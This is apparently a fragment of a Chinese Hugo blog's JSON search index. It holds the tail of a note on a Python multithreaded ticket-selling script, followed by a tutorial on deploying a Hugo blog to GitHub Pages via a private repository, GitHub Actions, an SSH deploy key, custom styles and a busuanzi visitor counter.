该脚本由于sale()函数采用while循环，当票被卖空才会跳出循环，导致当前线程会一直持续到票卖空才结束，如此一来线程只会创建到最大线程数5个（由信号量控制），用这5个线程卖完所有的票。这样38行处的控制窗口数处只需大于最大线程数5便可，无太多意义 在一般的脚本中，多线程执行的函数一般不会存在像该脚本如此的循环（一直循环消耗样本直到结束），正常情况下第38行处应为样本总数，这样才能实现100张票创建100个线程去买，通过信号量来控制最大线程数，线程执行完毕自动销毁 该脚本需做修改： 去除sale()函数中的while循环 第38行处20改为样本总数tt ","date":"2022-12-03","objectID":"/2/:0:0","tags":["Python"],"title":"Python多线程卖票","uri":"/2/"},{"categories":["平台搭建"],"content":"通过Hugo和Actions快速搭建github博客","date":"2022-11-15","objectID":"/1/","tags":["Blog"],"title":"通过Hugo和Actions快速搭建github博客","uri":"/1/"},{"categories":["平台搭建"],"content":"前言 简单叙述一下流程，先在本地仓库搭建好Hugo博客环境，再在github上创建两个仓库，其中一个可为任意名称的私有库暂且称其为Blog_Private，另一个必须是：github用户名.github.io为命名的公开库，假设你的用户名为xiaoming，该仓库名应为：xiaoming.github.io，且必须为公开库 本地仓库 Blog_Private库 xiaoming.github.io库 以上三个仓库准备好之后，再进行三步配置便可完成 第一步，将本地仓库提交到Blog_Private库中 第二步，配置Actions文件 第三步，生成并设置密钥 ","date":"2022-11-15","objectID":"/1/:1:0","tags":["Blog"],"title":"通过Hugo和Actions快速搭建github博客","uri":"/1/"},{"categories":["平台搭建"],"content":"思路 本地同步Blog_Private库，Blog_Private库通过Actions自动部署静态页面到公开库xiaoming.github.io中，通过域名xiaoming.github.io访问到公开库xiaoming.github.io的pages中查看博客 ","date":"2022-11-15","objectID":"/1/:1:1","tags":["Blog"],"title":"通过Hugo和Actions快速搭建github博客","uri":"/1/"},{"categories":["平台搭建"],"content":"好处 该方法是把源码部署到私有库中，将自动生成的静态页面放在公开库xiaoming.github.io中，相较于直接将源码部署到xiaoming.github.io中更加安全方便 ","date":"2022-11-15","objectID":"/1/:1:2","tags":["Blog"],"title":"通过Hugo和Actions快速搭建github博客","uri":"/1/"},{"categories":["平台搭建"],"content":"部署本地环境 注意 只适用于Hugo系统 推荐下载extended版本，该版本可自定义样式 Hugo下载地址：https://github.com/gohugoio/hugo/releases 解压到合适位置，配置hugo.exe的环境变量，方便使用命令行 这里参考LoveIt主题的文档：https://hugoloveit.com/zh-cn/theme-documentation-basics/ # 创建一个网站并进入 hugo new site my_website cd my_website # 通过git下载主题 # git安装参考：https://blog.csdn.net/mukes/article/details/115693833，几乎可以一路默认 git init git submodule add https://github.com/dillonzq/LoveIt.git themes/LoveIt # 修改config.toml配置文件，可进入https://hugoloveit.com/zh-cn/theme-documentation-basics/，作为配置参考 # 中文需要在第二行添加一条配置 defaultContentLanguage = \"zh-cn\" # 生成第一篇文章，在first_post.md随意输入，draft: true 改为 draft: false hugo new posts/first_post.md # 本地启动测试 hugo serve # 访问 http://127.0.0.1:1313 能成功访问到并能正常打开文章，本地环境便部署成功 还有很多主题可供选择：https://themes.gohugo.io/，使用时可参考Demo文档 文章开头可参考 --- title: \"test\" date: 1900-01-01 categories: [\"test\"] tags: [\"test\"] description: \"test\" draft: false --- \u003c!--more--\u003e ","date":"2022-11-15","objectID":"/1/:2:0","tags":["Blog"],"title":"通过Hugo和Actions快速搭建github博客","uri":"/1/"},{"categories":["平台搭建"],"content":"Git同步本地和远程仓库 通过HTTPS协议连接GitHub仓库，参考：https://www.cnblogs.com/liyan-blogs/p/15153764.html 过程中会遇到空目录不上传的问题，可在空目录中创建.gitkeep文件作为占位符 注意这里同步的是Blog_Private仓库 # 配置git git config --global user.name “your name” git config --global user.email “your email” # 在需要同步的本地仓库，执行初始化 git init # git关联远程仓库地址的三种方式 ## 1.先删后加，add是需要先删处再添加，origin默认推荐仓库名 git remote remove origin git remote add origin https://github.com/test/test.git ## 2.修改，set-url是在已有连接时修改关联远程数据库 git remote set-url \u003cremote_name\u003e \u003cremote_url\u003e git remote set-url origin https://github.com/test/test.git ## 3.直接修改config文件 git config -e # 获取token，在连接过程中会需要认证，选择token认证 右上角头像 --\u003e Settings --\u003e Developer Settings --\u003e Personal access tokens(classic) # 将远程仓库的文件pull到本地 git pull --rebase origin master # 提交代码小脚本:upload.bat @echo off cd 本地仓库根目录 git status # 查看代码状态 git add . # 将代码添加到暂存区，(.代表该目录下所有文件、还可用*.md等等) git commit -m \"first commit\" # 将代码提交到本地仓库(后跟该次提交的名称) git push origin master # 将代码push到远程仓库 pause ","date":"2022-11-15","objectID":"/1/:3:0","tags":["Blog"],"title":"通过Hugo和Actions快速搭建github博客","uri":"/1/"},{"categories":["平台搭建"],"content":"配置Actions文件 注意 在Blog_Private仓库的Actions中自定义一个workflows 配置如下，只适用于Hugo系统 name: GitHub Pages on: push: branches: - master jobs: deploy: runs-on: ubuntu-20.04 steps: - name: Checkout repositories uses: actions/checkout@v2 with: submodules: true fetch-depth: 0 - name: Setup Hugo uses: peaceiris/actions-hugo@v2 with: hugo-version: 'latest' - name: Build run: hugo - name: Deploy uses: peaceiris/actions-gh-pages@v3 with: deploy_key: ${{ secrets.ACTIONS_DEPLOY_KEY }} external_repository: xiaoming/xiaoming.github.io # 只需修改此处，改为自己的用户名 publish_branch: master publish_dir: ./public 配置完成后，再次点击Actions，点击中间main.yml，点击deploy，若发现只有Deploy步骤报错，便配置成功 此处有两个问题 secrets.ACTIONS_DEPLOY_KEY私钥和xiaoming.github.io的公钥未配置导致Deploy步骤报错 若未出现则无需理会。Actions会自动部署到xiaoming.github.io库的master分支，而现在xiaoming.github.io库可能默认为main分支，需要重命名main为master ","date":"2022-11-15","objectID":"/1/:4:0","tags":["Blog"],"title":"通过Hugo和Actions快速搭建github博客","uri":"/1/"},{"categories":["平台搭建"],"content":"生成并设置密钥 此处可参考：https://github.com/peaceiris/actions-gh-pages，Create SSH Deploy Key 处，有详细的位置图标 执行以下命令会生成两个文件 gh-pages.pub 是公钥 gh-pages 是私钥 ssh-keygen -t rsa -b 4096 -C \"$(git config user.email)\" -f gh-pages -N \"\" 公钥gh-pages.pub放在xiaoming.github.io中Settings的Deploy keys中，名字随意 私钥gh-pages放在Blog_Private中Settings的Secrets的Actions的New repository secrets，名字必须为ACTIONS_DEPLOY_KEY 配置完成后，再次点击Actions，点击中间main.yml，点击右边Re-run all jobs，无报错，便完成 ","date":"2022-11-15","objectID":"/1/:5:0","tags":["Blog"],"title":"通过Hugo和Actions快速搭建github博客","uri":"/1/"},{"categories":["平台搭建"],"content":"自定义样式 信息 参考：https://lucas-0.github.io/ 创建文件：\\assets\\css\\\\_custom.scss // ============================== // Custom style // 自定义样式 // ============================== @import url('https://fonts.googleapis.com/css2?family=Rock+Salt\u0026family=Noto+Serif+SC\u0026family=Roboto+Slab:wght@100..900\u0026display=swap'); .page { position: relative; max-width: 800px; //宽度限制800 margin: 0 auto; } 创建文件：\\assets\\css\\\\_override.scss // ============================== // Override Variables // 覆盖变量 // ============================== // @import url('https://fonts.proxy.ustclug.org/css2?family=Rock+Salt\u0026family=Noto+Serif+SC:wght@400;600;700\u0026family=Roboto+Slab:wght@400;600;700\u0026display=swap'); //使用中科大加速 // @import url('https://fonts.googleapis.com/css2?family=Rock+Salt\u0026family=Noto+Serif+SC:wght@200..900\u0026family=Roboto+Slab:wght@100..900\u0026display=swap'); // Font and Line Height $global-font-family: \"Roboto Slab\", \"Noto Serif SC\", \"PingFang SC\", \"Hiragino Sans GB\", \"Microsoft Yahei\", \"WenQuanYi Micro Hei\", \"Segoe UI Emoji\", \"Segoe UI Symbol\", Helvetica, Arial, -apple-system, system-ui, sans-serif; $global-font-size: 18px; $global-font-weight: 400; //粗细 $global-line-height: 1.75rem; //文本行的基线间的距离 原始1.5rem会让屏幕宽不够时h1重合 h1{font-size:1.5em;} //原始为2em，会与行高1.5rem冲突，修改为1.5em $header-title-font-family: \"Rock Salt\", -apple-system, system-ui, sans-serif; // Color of the secondary text $global-font-secondary-color: #7d7d84; ","date":"2022-11-15","objectID":"/1/:6:0","tags":["Blog"],"title":"通过Hugo和Actions快速搭建github博客","uri":"/1/"},{"categories":["平台搭建"],"content":"集成不蒜子统计访问量 信息 参考：https://xwi88.com/hugo-plugin-busuanzi/ 不蒜子：http://busuanzi.ibruce.info/ 将自定义配置添加在[params.page]文章页面全局配置里 # xwi88 自定义配置 xwi88Cfg [params.xwi88Cfg] [params.xwi88Cfg.summary] update = true # summary 更新日期显示 [params.xwi88Cfg.page] update = true # pages 更新日期显示 [params.xwi88Cfg.busuanzi] enable = true # custom uv for the whole site site_uv = true site_uv_pre = '\u003ci class=\"fa fa-user\"\u003e\u003c/i\u003e' # 字符或提示语 site_uv_post = '' # custom pv for the whole site site_pv = true site_pv_pre = '\u003ci class=\"fa fa-eye\"\u003e\u003c/i\u003e' # site_pv_post = '\u003ci class=\"far fa-eye fa-fw\"\u003e\u003c/i\u003e' site_pv_post = '' # custom pv span for one page only page_pv = true page_pv_pre = '\u003ci class=\"far fa-eye fa-fw\"\u003e\u003c/i\u003e' page_pv_post = '' 在layouts/partials/plugin目录里创建文件busuanzi.html，如果不存在该目录就创建目录，文件内容如下： {{ if .params.enable }} {{ if eq .bsz_type \"footer\" }} {{/* 只有 footer 才刷新，防止页面进行多次调用，计数重复; 只要启用就计数，显示与否看具体设置 */}} \u003cscript async src=\"//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js\"\u003e\u003c/script\u003e {{ end }} {{ if or (eq .params.site_pv true) (eq .params.site_uv true) (eq .params.page_pv true) }} {{ if eq .bsz_type \"footer\" }} \u003csection\u003e {{ if eq .params.site_pv true }} \u003cspan id=\"busuanzi_container_value_site_pv\"\u003e {{- with .params.page_pv_pre -}} {{ . | safeHTML }} {{ end }} \u003cspan id=\"busuanzi_value_site_pv\"\u003e\u003c/span\u003e \u003c/span\u003e {{ end }} {{ if and (eq .params.site_pv true) (eq .params.site_uv true) }} \u0026nbsp;|\u0026nbsp; {{ end }} {{ if eq .params.site_uv true }} \u003cspan id=\"busuanzi_container_value_site_uv\"\u003e {{- with .params.site_uv_pre -}} {{ . | safeHTML }} {{ end }} \u003cspan id=\"busuanzi_value_site_uv\"\u003e\u003c/span\u003e \u003c/span\u003e {{ end }} \u003c/section\u003e {{ end }} {{/* page pv 只在 page 显示 */}} {{ if and (eq .params.page_pv true) (eq .bsz_type \"page-reading\") }} \u003cspan id=\"busuanzi_container_value_page_pv\"\u003e {{- with .params.page_pv_pre -}} {{ . | safeHTML }} {{ end }} \u003cspan id=\"busuanzi_value_page_pv\"\u003e\u003c/span\u003e\u0026nbsp; {{- T \"views\" -}} \u003c/span\u003e {{ end }} {{ end }} {{ end }} 复制themes/LoveIt/layouts/partials/footer.html到layouts/partials/footer.html 在第9行{{- end -}}后回车添加： {{- /* busuanzi plugin */ -}} {{- partial \"plugin/busuanzi.html\" (dict \"params\" .Site.Params.xwi88Cfg.busuanzi \"bsz_type\" \"footer\") -}} 复制themes/LoveIt/layouts/posts/single.html到layouts/posts/single.html 在第62行{{- end -}}后回车添加： {{- /* busuanzi plugin */ -}} {{- partial \"plugin/busuanzi.html\" (dict \"params\" .Site.Params.xwi88Cfg.busuanzi \"bsz_type\" \"page-reading\") -}} 注意 本地测试时出现大量的访问量是正常情况，部署到服务器上后，通过独自的url访问便会恢复正常 ","date":"2022-11-15","objectID":"/1/:7:0","tags":["Blog"],"title":"通过Hugo和Actions快速搭建github博客","uri":"/1/"}]